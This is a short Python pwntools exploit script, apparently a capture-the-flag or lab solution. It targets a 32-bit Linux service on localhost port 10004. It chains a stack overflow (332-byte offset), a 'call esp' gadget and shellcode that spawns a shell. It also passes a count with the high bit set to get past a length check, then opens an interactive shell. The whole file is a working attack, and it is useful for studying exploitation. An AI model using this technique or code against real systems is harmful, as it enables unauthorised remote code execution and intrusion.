#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux")

SHELLCODE = asm(shellcraft.findpeersh())
RET_OFFSET = 332
CALL_ESP = 0x08048ad8 #Found with "ROPgadget --binary $B | grep -E ': ((jmp)|(call)) ((ecx)|(esp))'"
USER_SIZE = 40
PAYLOAD = flat('A' * RET_OFFSET,
               CALL_ESP,
               SHELLCODE)
#Make payload a multiple of 'USER_SIZE'
while not len(PAYLOAD) % USER_SIZE == 0:
    PAYLOAD += 'A'
#We must tell the program how many user objects it should expect
NUM_USER_OBJECTS = len(PAYLOAD) / USER_SIZE

r = remote('localhost', 10004)
r.send(flat(NUM_USER_OBJECTS | 0x80000000, PAYLOAD))
r.interactive()
